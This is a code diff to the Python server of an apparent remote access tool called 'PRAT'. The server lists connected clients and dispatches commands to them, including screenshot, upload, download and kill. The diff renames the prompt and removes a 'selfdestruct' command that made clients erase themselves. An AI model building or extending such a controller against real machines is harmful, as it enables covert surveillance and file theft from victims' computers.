@@ -94,11 +94,6 @@ class Server(threading.Thread):
         self.remove_client(self.current_client.uid)
         self.current_client = None
 
-    def selfdestruct_client(self, _):
-        self.send_client('selfdestruct', self.current_client)
-        self.current_client.conn.close()
-        self.remove_client(self.current_client.uid)
-        self.current_client = None
 
     def get_clients(self):
         return [v for _, v in self.clients.items()]
@@ -176,7 +171,7 @@ class ClientConnection():
 
 
 def get_parser():
-    parser = argparse.ArgumentParser(description='R server')
+    parser = argparse.ArgumentParser(description='PRAT server')
     parser.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
     return parser
@@ -204,7 +199,6 @@ def main():
         'help': server.print_help,
         'kill': server.kill_client,
         'quit': server.quit_server,
-        'selfdestruct': server.selfdestruct_client,
         'screenshot': server.screenshot,
         'upload': server.upload,
         'download': server.download
@@ -229,7 +223,7 @@ def main():
         else:
             ccid = '?'
 
-        prompt = raw_input('\n[{}] R> '.format(ccid)).rstrip()
+        prompt = raw_input('\n[{}] PRAT> '.format(ccid)).rstrip()
 
         # allow noop
         if not prompt:
@@ -238,10 +232,6 @@ def main():
         # seperate prompt into command and action
         cmd, _, action = prompt.partition(' ')
 
-        # if cmd =='upload':
-        #     server.upload(server.current_client)
-        # if cmd == 'download':
-        #     server.download()
 
         if cmd in server_commands:
             server_commands[cmd](action)
